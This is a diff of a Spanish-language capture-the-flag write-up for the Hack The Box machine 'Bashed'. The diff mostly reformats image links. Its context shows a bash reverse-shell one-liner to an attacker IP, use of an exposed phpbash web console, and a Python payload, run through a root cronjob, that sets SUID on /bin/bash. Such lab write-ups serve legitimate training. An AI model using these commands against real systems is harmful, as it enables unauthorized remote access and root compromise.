@@ -1,4 +1,3 @@
-
 # Writeup: Bashed (HTB)
 
 **IP Máquina:** 10.129.23.138  
@@ -25,7 +24,7 @@ Para complementar, corremos el script `http-enum` de nmap en busca de directorio
 nmap --script http-enum -p80 10.129.23.138 -oN webScan
 ```
 
-Al revisar las rutas descubiertas y navegar por la web, nos encontramos con una utilidad web en PHP (_phpbash_) que funciona como una consola interactiva en el propio navegador, permitiéndonos ejecutar comandos directamente en el sistema con los privilegios del servidor web (`www-data`).
+Al revisar las rutas descubiertas y navegar por la web, nos encontramos con una utilidad web en PHP (_phpbash_) que funciona como una consola interactiva en el propio navegador, permitiéndonos ej[...]
 
 ## 2. Acceso Inicial (Reverse Shell)
 
@@ -45,7 +44,7 @@ bash -c "bash -i >& /dev/tcp/10.10.17.184/443 0>&1"
 
 ### Tratamiento de la TTY
 
-Una shell directa por netcar es frágil: no tenemos autocompletado con tabulador, no funcionan las flechas de dirección y un simple `Ctrl + C` cerraría la sesión. Para dejarla completamente interactiva y estable, realizamos este tratamiento
+Una shell directa por netcar es frágil: no tenemos autocompletado con tabulador, no funcionan las flechas de dirección y un simple `Ctrl + C` cerraría la sesión. Para dejarla completamente int[...]
 
 ```bash
 # 1. Generamos una pseudoterminal dentro de la máquina remota sin dejar registros
@@ -95,21 +94,21 @@ Localizamos un directorio peculiar en la raíz llamado `/scripts`. Dentro vemos 
 - `test.py` (propiedad de `scriptmanager`)
 - `test.txt` (propiedad de `root`)
 
-![[imgs 1/contenido_test.py bashed.png]]
+![contenido_test.py bashed](imgs%201/contenido_test.py%20bashed.png)
 
 Al inspeccionar los permisos y las fechas de modificación con `ls -la`, notamos que el contenido de `test.txt` se actualiza de manera constante y su dueño es `root`.
 
-![[imgs 1/ls-scripts.png]]
+![ls-scripts](imgs%201/ls-scripts.png)
 
 Esto quiere decir que es un cronjob en segundo plano donde `root` ejecuta cada X tiempo el script `test.py`.
 
 Para comprobarlo, implementamos un pequeño monitor de procesos en bash
 
-![[imgs 1/procmon.png]]
+![procmon](imgs%201/procmon.png)
 
 Le damos permisos de ejecución y lo ejecutamos:
 
-![[imgs 1/procesos_bashed.png]]
+![procesos_bashed](imgs%201/procesos_bashed.png)
 
 La monitorización confirma que `root` entra en el directorio `/scripts` y ejecuta los scripts `.py` cada minuto.
 
@@ -122,7 +121,7 @@ import os
 os.system("chmod u+s /bin/bash")
 ```
 
-![[imgs 1/suid.png]]
+![suid](imgs%201/suid.png)
 
 Supervisamos los permisos de `/bin/bash` esperando a que transcurra el minuto y la tarea se ejecute:
 
